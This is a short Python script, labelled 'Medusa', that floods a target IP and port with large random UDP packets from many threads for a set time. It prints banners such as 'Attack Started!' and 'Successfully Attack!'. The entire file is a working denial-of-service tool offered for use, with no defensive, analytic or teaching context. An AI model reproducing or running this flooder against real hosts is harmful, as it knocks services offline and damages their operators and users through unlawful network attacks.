import socket
import sys, os
import threading
import time
import random

if len(sys.argv) < 5:
  print("""gì""")
  sys.exit(" ip port packet thread time")

print("\x1b[31m[\x1b[33mMedusa\x1b[31m] \x1b[0mAttack Started!")
ip = str(sys.argv[1])
port = int(sys.argv[2])
packet = int(sys.argv[3])
threads = int(sys.argv[4])
times = float(sys.argv[5])

timeout = time.time() + 1 * times

def udp(ip, port, packet, times):
  timeout = time.time() + 1 * times
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
  print(f"\x1b[31m[\x1b[33mMedusa\x1b[31m] \x1b[0mAttacking... \x1b[31m>  \x1b[0mtime \x1b[32m{times} \x1b[0mip \x1b[32m{ip}\x1b[31m:\x1b[32m{port}\x1b[0m packet \x1b[32m{packet}\x1b[0m threads \x1b[32m{threads}\x1b[0m ")
  while time.time() < timeout:
    try:
      try:
        data = random._urandom(int(random.randint(1025, 65505)))
        for _ in range(packet):
          s.sendto(data, (str(ip), int(port)))
      except:
        s.close()
    except:
      s.close()
  print("\x1b[31m[\x1b[33mMedusa\x1b[31m] > \x1b[0mSuccessfully Attack!")

def main():
  global threads
  for _ in range(threads):
    thread = []
    th = threading.Thread(target=udp, args=(ip, port, packet, times))
    thread.append(th)
    th.start()

if __name__ == '__main__':
  try:
    main()
  except KeyboardInterrupt:
    print('\x1b[31m[\x1b[33mMedusa\x1b[31m] \x1b[0mAttack Over!')
    sys.exit()
